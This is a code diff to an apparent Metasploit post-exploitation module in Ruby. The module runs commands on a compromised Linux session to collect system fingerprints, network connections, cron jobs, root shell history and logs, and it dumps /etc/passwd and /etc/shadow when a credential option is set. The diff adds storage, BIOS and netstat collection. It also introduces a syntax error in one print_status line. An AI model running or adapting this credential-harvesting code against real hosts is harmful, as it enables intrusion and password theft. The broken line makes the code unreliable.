@@ -193,7 +193,7 @@ def run
 
 
       #
-      # Dump system information from target system (fingerprints)
+      # Dump system information from target (fingerprints)
       #
       data_dump=''
       print_status("Executing list of commands remotelly ..")
@@ -202,6 +202,8 @@ def run
       # bash commands to be executed remotelly ..
       #
       date_out = cmd_exec("date")
+      file_sys = cmd_exec("df -H")
+      storage_mont = cmd_exec("lsblk")
       distro_uname = cmd_exec("uname -a")
       current_shell = cmd_exec("echo $0")
       distro_shells = cmd_exec("grep '^[^#]' /etc/shells")
@@ -212,13 +214,15 @@ def run
       model_name = cmd_exec("lscpu | grep \"Model name:\" | awk {'print $3,$4,$5,$6,$7,$8,$9,$10'}")
       distro_description = cmd_exec("cat /etc/*-release | grep 'DISTRIB_DESCRIPTION=' | cut -d '=' -f2")
       distro_mem = cmd_exec("cat /proc/meminfo | grep \"MemTotal\"; cat /proc/meminfo | grep \"MemFree\"; cat /proc/meminfo | grep \"MemAvailable\"; cat /proc/meminfo | grep \"Dirty\"")
+        print_status("Storing results into msf database ..")
+        Rex::sleep(0.5)
         #
         # Store data into a local variable (data_dump) ..
         # to be able to write the logfile and display the outputs ..
         #
         data_dump << "\n\n"
-        data_dump << date_out
-        data_dump << "\n----------------------------\n"
+        data_dump << "Date/Hour: " + date_out + "\n"
+        data_dump << "----------------------------\n"
         data_dump << "Running on session  : #{datastore['SESSION']}\n"
         data_dump << "Target Architecture : #{sys_info['Architecture']}\n"
         data_dump << "Target Arch (bits)  : #{hardware_bits}\n"
@@ -234,6 +238,14 @@ def run
         data_dump << "Distro uname        : #{distro_uname}\n"
         data_dump << "Distro description  : #{distro_description}\n"
         data_dump << "\n\n\n"
+        data_dump << "FILE SYSTEM\n"
+        data_dump << "------------\n"
+        data_dump << file_sys
+        data_dump << "\n\n"
+        data_dump << "STORAGE DEVICES\n"
+        data_dump << "------------\n"
+        data_dump << storage_mont
+        data_dump << "\n\n"
         data_dump << "MEMORY STATS\n"
         data_dump << "------------\n"
         data_dump << distro_mem
@@ -260,11 +272,14 @@ def run
           #
           # bash commands to be executed remotelly ..
           #
+          demi_bios = cmd_exec("dmidecode -t bios")
           cron_tasks = cmd_exec("ls -la /etc/cron*")
+          net_stat = cmd_exec("netstat -ano | grep 'tcp'")
           root_services = cmd_exec("ps -aux | grep '^root'")
           distro_history = cmd_exec("ls -la /root/.*_history")
           distro_logs = cmd_exec("find /var/log -type f -perm -4")
-            #
+          print_status("Storing results into msf database ..")
+          Rex::sleep(0.5)            #
             # store data into a local variable (data_dump) ..
             # to be able to write the logfile and display the outputs ..
             #
@@ -288,6 +303,14 @@ def run
             data_dump << "-------------\n"
             data_dump << cron_tasks
             data_dump << "\n\n"
+            data_dump << "NETSTAT -ANO | GREP TCP\n"
+            data_dump << "-----------------------\n"
+            data_dump << net_stat
+            data_dump << "\n\n"
+            data_dump << "SMBIOS DATA (sysfs)\n"
+            data_dump << "-------------------\n"
+            data_dump << demi_bios
+            data_dump << "\n\n"
         end
 
 
@@ -297,7 +320,7 @@ def run
         # if sellected previous in advanced options (set CREDENTIALS_DUMP true) ..
         #
         if datastore['CREDENTIALS_DUMP'] == true
-          print_status("Dumping remote credentials from target ..")
+          print_status"Dumping remote credentials from target ..")
           Rex::sleep(0.5)
           #
           # bash commands to be executed remotelly ..
@@ -309,6 +332,8 @@ def run
           # dump etc/passwd & etc/shadow files from target
           etc_pass = cmd_exec("cat /etc/passwd")
           etc_shadow = cmd_exec("cat /etc/shadow")
+          print_status("Storing results into msf database ..")
+          Rex::sleep(0.5)
             #
             # store data into a local variable (data_dump) ..
             # to be able to write the logfile and display the outputs ..
@@ -352,6 +377,8 @@ def run
           Rex::sleep(0.5)
           # bash command to be executed remotelly ..
           single_comm = cmd_exec("#{exec_bash}")
+          print_status("Storing results into msf database ..")
+          Rex::sleep(0.5)
             #
             # store data into a local variable (data_dump) ..
             # to be able to write the logfile and display the outputs ..
@@ -372,7 +399,7 @@ def run
        # Displaying results on screen (data_dump) ..
        #
        print_status("Remote scans completed, building list ..")
-       Rex::sleep(1.0)
+       Rex::sleep(2.0)
        # print the contents of 'data_dump' variable on screen ..
        print_line(data_dump)
        Rex::sleep(0.5)
